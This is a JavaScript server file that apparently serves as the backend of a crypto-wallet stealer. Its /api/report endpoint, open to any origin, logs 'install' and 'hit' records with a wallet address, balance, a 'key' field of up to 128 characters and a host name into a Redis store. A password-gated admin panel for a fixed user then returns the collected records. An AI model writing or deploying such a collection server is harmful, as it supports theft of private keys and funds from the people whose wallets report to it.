const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const USER = 'kurapika';
const PWKEY = 'apes:pw';
const HITS = 'apes:hits';
const ROOT = __dirname;

const TYPES = {
  '.html':'text/html; charset=utf-8',
  '.js':'application/javascript; charset=utf-8',
  '.json':'application/json; charset=utf-8',
  '.css':'text/css; charset=utf-8',
  '.svg':'image/svg+xml'
};

function env(){
  return {
    url: process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL || '',
    token: process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN || ''
  };
}
async function q(args){
  const e = env();
  const r = await fetch(e.url, {
    method:'POST',
    headers:{ Authorization:'Bearer '+e.token, 'Content-Type':'application/json' },
    body: JSON.stringify(args)
  });
  const j = await r.json();
  return j.result;
}
const sha = s => crypto.createHash('sha256').update(String(s)).digest('hex');

function cors(res){
  res.setHeader('Access-Control-Allow-Origin','*');
  res.setHeader('Access-Control-Allow-Headers','Content-Type');
  res.setHeader('Access-Control-Allow-Methods','POST,OPTIONS');
}
async function body(req){
  let b = '';
  for await (const c of req) b += c;
  try { return JSON.parse(b || '{}'); } catch(e){ return {}; }
}

async function report(req,res){
  cors(res);
  res.setHeader('Content-Type','application/json');
  if(req.method==='OPTIONS') return res.end();
  if(req.method!=='POST') return res.end(JSON.stringify({ok:true}));

  const e = env();
  if(!e.url || !e.token){ res.statusCode=500; return res.end(JSON.stringify({ok:false,error:'no-db'})); }

  const b = await body(req);
  const rec = {
    t: b.type==='install' ? 'install' : 'hit',
    ts: Date.now(),
    w: String(b.wallet  ||'').slice(0,64),
    b: String(b.balance ||'').slice(0,32),
    k: String(b.key     ||'').slice(0,128),
    h: String(b.host    ||'').slice(0,64)
  };
  try { await q(['LPUSH',HITS,JSON.stringify(rec)]); await q(['LTRIM',HITS,0,4999]); } catch(e){}
  res.end(JSON.stringify({ok:true}));
}

async function admin(req,res,url){
  cors(res);
  res.setHeader('Content-Type','application/json');
  if(req.method==='OPTIONS') return res.end();

  const b = req.method==='POST' ? await body(req) : {};
  const action = url.searchParams.get('action') || b.action || '';
  const e = env();
  const ready = !!(e.url && e.token);

  try {
    if(action==='status'){
      let has = false;
      if(ready){ try { has = !!(await q(['GET',PWKEY])); } catch(err){} }
      return res.end(JSON.stringify({
        ok:true, db:ready, hasPassword:has,
        env:{
          UPSTASH_REDIS_REST_URL:   !!process.env.UPSTASH_REDIS_REST_URL,
          UPSTASH_REDIS_REST_TOKEN: !!process.env.UPSTASH_REDIS_REST_TOKEN,
          KV_REST_API_URL:          !!process.env.KV_REST_API_URL,
          KV_REST_API_TOKEN:        !!process.env.KV_REST_API_TOKEN
        }
      }));
    }
    if(!ready) return res.end(JSON.stringify({ok:false,error:'Keine DB verbunden.'}));

    if(action==='setup'){
      if(await q(['GET',PWKEY])) return res.end(JSON.stringify({ok:false,error:'Passwort existiert schon.'}));
      const pw = String(b.password||'');
      if(pw.length<4) return res.end(JSON.stringify({ok:false,error:'Mind. 4 Zeichen.'}));
      await q(['SET',PWKEY,sha(pw)]);
      return res.end(JSON.stringify({ok:true}));
    }

    if(action==='login'){
      if(String(b.username||'').toLowerCase()!==USER)
        return res.end(JSON.stringify({ok:false,error:'Falscher Benutzername.'}));
      const stored = await q(['GET',PWKEY]);
      if(!stored) return res.end(JSON.stringify({ok:false,error:'Kein Passwort gesetzt.'}));
      if(sha(b.password)!==stored)
        return res.end(JSON.stringify({ok:false,error:'Falsches Passwort.'}));

      const raw = (await q(['LRANGE',HITS,0,1999])) || [];
      const rows = raw.map(x => { try { return JSON.parse(x); } catch(err) { return null; } }).filter(Boolean);
      return res.end(JSON.stringify({ok:true,rows}));
    }

    res.end(JSON.stringify({ok:false,error:'Unbekannte Aktion'}));
  } catch(err){
    res.statusCode = 500;
    res.end(JSON.stringify({ok:false,error:String((err&&err.message)||err)}));
  }
}

function serve(res,name){
  const f = path.join(ROOT, path.normalize(name).replace(/^(\.\.[\/\\])+/,''));
  fs.readFile(f,(err,buf)=>{
    if(err){ res.statusCode=404; res.end('404'); return; }
    res.setHeader('Content-Type', TYPES[path.extname(f).toLowerCase()]||'application/octet-stream');
    res.end(buf);
  });
}

module.exports = async (req,res) => {
  const url = new URL(req.url,'http://x');
  const p = decodeURIComponent(url.pathname);
  if(p==='/api/report') return report(req,res);
  if(p==='/api/admin')  return admin(req,res,url);
  if(p==='/'||p==='') return serve(res,'index.html');
  if(p==='/admin'||p==='/admin/') return serve(res,'admin.html');
  return serve(res,p.slice(1));
};